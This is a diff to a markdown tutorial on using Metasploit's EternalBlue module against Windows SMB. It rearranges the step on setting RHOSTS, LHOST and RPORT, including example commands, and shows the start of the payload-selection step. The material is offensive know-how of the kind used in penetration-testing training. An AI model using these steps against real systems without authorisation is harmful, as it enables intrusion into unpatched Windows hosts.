@@ -42,18 +42,20 @@ use exploit/windows/smb/ms17_010_eternalblue
 
 ## 5. Set Required Parameters
 
+Configure necessary parameters by employing the show options command to view and adjust settings as needed. Common options include `RHOSTS`,`LHOST`, `RPORT`, etc.
+
+-------------------------------------------------------------------------------
+| Parameter | Description                           | Example Usage           |
+|-----------|---------------------------------------|-------------------------|
+| RHOSTS    | Remote host(s) IP address(es)         | `set RHOSTS 192.168.1.5`|
+| LHOST     | Local host listening IP for payloads  | `set LHOST 192.168.1.2` |
+| RPORT     | Remote port for the target service    | `set RPORT 445`         |
+-------------------------------------------------------------------------------
+
 ```bash
 Set RHOSTS <Target IP>
 ```
 
-Review other options that might need configuration using the `show options` command and set them accordingly. Common options include `LHOST`, `RPORT`, etc.
------------------------------------------------------------------------------
-| Parameter | Description                           | Example Usage         |
-|-----------|---------------------------------------|-----------------------|
-| RHOSTS    | Remote host(s) IP address(es)         | set RHOSTS 192.168.1.5|
-| LHOST     | Local host listening IP for payloads  | set LHOST 192.168.1.2 |
-| RPORT     | Remote port for the target service    | set RPORT 445         |
------------------------------------------------------------------------------
 ## 6. Set Payload
 
 After selecting the exploit module, you need to set the payload that will be delivered to the compromised system. This payload determines the action or code executed on the target after exploitation.
